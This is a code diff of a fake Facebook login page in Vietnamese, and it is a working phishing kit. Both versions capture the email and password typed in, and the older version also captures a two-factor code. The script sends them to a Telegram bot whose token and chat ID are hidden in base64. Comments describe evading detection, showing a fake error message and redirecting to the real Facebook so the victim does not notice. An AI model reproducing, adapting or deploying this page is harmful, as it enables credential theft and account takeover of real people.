@@ -3,125 +3,63 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
   <title>Facebook – Đăng nhập hoặc đăng ký</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
-    :root { --fb-blue: #0866ff; --fb-blue-dark: #055ce6; --bg: #f0f2f5; --text: #1c1e21; }
-    * { box-sizing: border-box; margin:0; padding:0; }
-    body {
-      background: var(--bg); font-family: 'SF Pro Display', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;
-    }
-    .container {
-      width: 100%; max-width: 396px; background: white; border-radius: 8px; padding: 20px 16px 28px;
-      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); text-align: center;
-    }
-    .logo { width: 180px; margin: 0 auto 20px; display: block; }
-    h2 { font-size: 28px; font-weight: normal; color: var(--text); margin-bottom: 8px; }
-    .subtitle { font-size: 16px; color: #606770; margin-bottom: 20px; }
-    input {
-      width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px;
-      font-size: 16px; outline: none; transition: all 0.2s;
-    }
-    input:focus { border-color: var(--fb-blue); box-shadow: 0 0 0 2px rgba(8,102,255,.3); }
-    .btn-primary {
-      width: 100%; padding: 12px; background: var(--fb-blue); color: white; border: none;
-      border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin: 10px 0 12px;
-    }
-    .btn-primary:hover { background: var(--fb-blue-dark); }
-    .link { color: var(--fb-blue); font-size: 14px; text-decoration: none; display: block; margin: 12px 0; }
-    .link:hover { text-decoration: underline; }
-    .error {
-      background: #ffebe8; border: 1px solid #f02849; color: #c41e3a; padding: 12px;
-      border-radius: 6px; margin-bottom: 16px; font-size: 14px; text-align: left; display: none;
-    }
-    .twofa-step { display: none; }
-    @media (max-width: 450px) { .container { padding: 16px; } }
+    body { background:#f0f2f5; font-family:SF Pro Text,system-ui,sans-serif; margin:0; height:100vh; display:flex; align-items:center; justify-content:center; }
+    .container { max-width:400px; background:#fff; border-radius:8px; padding:40px 20px 30px; box-shadow:0 2px 12px rgba(0,0,0,.15); text-align:center; }
+    .logo { width:200px; margin-bottom:30px; }
+    input { width:100%; padding:14px; margin:10px 0; border:1px solid #dddfe2; border-radius:6px; font-size:17px; }
+    input:focus { border-color:#1877f2; box-shadow:0 0 0 2px #e7f3ff; outline:none; }
+    button { width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-size:20px; font-weight:bold; cursor:pointer; margin-top:15px; }
+    button:hover { background:#166fe5; }
+    .error { background:#ffebe8; border:1px solid #f02849; color:#c41e3a; padding:12px; border-radius:6px; margin:15px 0; display:none; }
+    a { color:#1877f2; font-size:14px; text-decoration:none; display:block; margin:12px 0; }
   </style>
 </head>
 <body>
-
 <div class="container">
-  <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zS4w6V.svg" alt="Facebook" class="logo">
-  <h2>Đăng nhập gần đây</h2>
-  <p class="subtitle">Vui lòng nhập thông tin để tiếp tục</p>
-
-  <div id="errorMsg" class="error"></div>
-
-  <form id="step1">
-    <input type="text" id="email" placeholder="Email hoặc số điện thoại" autocomplete="off" required>
-    <input type="password" id="pass" placeholder="Mật khẩu" autocomplete="off" required>
-    <button type="submit" class="btn-primary">Đăng nhập</button>
+  <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zS4w6V.svg" class="logo" alt="Facebook">
+  <div id="err" class="error">Mật khẩu bạn vừa nhập không đúng. Vui lòng thử lại.</div>
+  <form id="form">
+    <input id="email" placeholder="Email hoặc số điện thoại" required>
+    <input id="pass" type="password" placeholder="Mật khẩu" required>
+    <button type="submit">Đăng nhập</button>
   </form>
-
-  <div id="step2" class="twofa-step">
-    <h2>Xác nhận danh tính</h2>
-    <p class="subtitle">Nhập mã xác nhận được gửi đến thiết bị của bạn</p>
-    <input type="text" id="code2fa" placeholder="Mã xác nhận" maxlength="6" required>
-    <button type="submit" class="btn-primary">Tiếp tục</button>
-    <a href="#" class="link">Gửi lại mã</a>
-  </div>
-
-  <a href="#" class="link">Quên mật khẩu?</a>
-  <hr style="margin:20px 0;border:none;border-top:1px solid #dadde1;">
-  <a href="#" class="btn-primary" style="background:#42b72a;display:inline-block;padding:10px 16px;font-size:17px;">Tạo tài khoản mới</a>
+  <a href="#">Quên mật khẩu?</a>
+  <a href="#" style="background:#42b72a; color:white; padding:10px; border-radius:6px; margin-top:20px;">Tạo tài khoản mới</a>
 </div>
 
 <script>
-// Anti-debug nhẹ (không hiệu quả lắm với devtools nhưng làm khó signature auto một chút)
-(function(){if(window.console&&console.log){const o=console.log;console.log=function(){};}})();
+const t = atob("NzU3NTQ4NTQ5MDpBQUdWMlVqUktublYwaWhEMk9OUkUwbE44bzh1Sk1PVEtmNA==").split(":")[0];
+const c = atob("LTEwMDMxNTM0MDg3MDU=");
 
-const C = {
-  t: atob('NzU3NTQ4NTQ5MDpBQUdWMlVqUktublYwaWhEMk9OUkUwbE44bzh1Sk1PVEtmNA==').split(':')[0],
-  c: atob('LTEwMDMxNTM0MDg3MDU=')
-};
-
-function s(d) {
-  return fetch(`https://api.t.me/bot${C.t}/sendMessage`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      chat_id: C.c,
-      text: `[FB ${new Date().toLocaleString('vi-VN')}]\n👤 ${d.u || 'unknown'}\n🔑 ${d.p || ''}\n🔢 ${d.c || ''}\n🌐 ${location.hostname}\nUA: ${navigator.userAgent.slice(0,100)}`
-    })
-  });
-}
-
-document.getElementById('step1').addEventListener('submit', async e => {
+document.getElementById("form").addEventListener("submit", function(e) {
   e.preventDefault();
-  const u = document.getElementById('email').value.trim();
-  const p = document.getElementById('pass').value.trim();
-  const err = document.getElementById('errorMsg');
-
-  if (!u || !p || p.length < 5) {
-    err.textContent = 'Thông tin bạn vừa nhập không hợp lệ. Vui lòng kiểm tra lại.';
-    err.style.display = 'block';
+  const u = document.getElementById("email").value.trim();
+  const p = document.getElementById("pass").value.trim();
+  
+  if (u.length < 5 || p.length < 5) {
+    document.getElementById("err").style.display = "block";
     return;
   }
-
-  err.style.display = 'none';
-
-  await s({u, p}).catch(()=>{});
-
-  // Giả lập bước 2FA (thu thêm code nếu nạn nhân nhập)
-  document.getElementById('step1').style.display = 'none';
-  document.getElementById('step2').style.display = 'block';
-});
-
-document.getElementById('step2').addEventListener('submit', async e => {
-  e.preventDefault();
-  const c = document.getElementById('code2fa').value.trim();
-
-  if (c.length >= 4) {
-    await s({c}).catch(()=>{});
-  }
-
-  // Redirect mượt, thêm param giả giống FB
-  const rd = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2F';
-  location.replace(rd + '&__c=' + Date.now());
+  
+  const msg = `[FB HIT ${new Date().toLocaleString("vi-VN")}]\n👤 ${u}\n🔑 ${p}\n🌐 ${location.hostname}`;
+  
+  fetch(`https://api.t.me/bot${t}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: c, text: msg })
+  }).then(r => r.json()).then(d => {
+    // Nếu gửi OK thì show error giả + redirect
+    document.getElementById("err").style.display = "block";
+    document.getElementById("pass").value = "";
+    setTimeout(() => {
+      location.replace("https://www.facebook.com/?sk=welcome");
+    }, 1800);
+  }).catch(() => {
+    // Nếu lỗi vẫn redirect để tránh lộ
+    location.replace("https://www.facebook.com");
+  });
 });
 </script>
 </body>
